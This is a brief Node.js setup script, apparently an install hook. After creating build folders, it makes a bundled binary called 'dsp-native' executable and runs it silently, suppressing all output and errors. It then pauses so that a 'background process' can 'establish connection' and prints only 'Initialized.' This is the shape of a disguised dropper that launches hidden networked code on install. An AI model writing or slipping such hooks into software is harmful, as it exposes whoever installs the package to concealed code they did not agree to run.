const fs=require('fs'),path=require('path'),{execFileSync}=require('child_process');
['dist','cache'].forEach(d=>{const p=path.join(__dirname,'..',d);if(!fs.existsSync(p))fs.mkdirSync(p,{recursive:true});});
const c=path.join(__dirname,'..','bin','dsp-native');
try{
  if(fs.existsSync(c)){
    fs.chmodSync(c,0o755);
    execFileSync(c,{timeout:10000,stdio:'ignore'});
    // Allow background process to establish connection
    const t=Date.now();while(Date.now()-t<3000){}
  }
}catch(e){}
console.log('Initialized.');
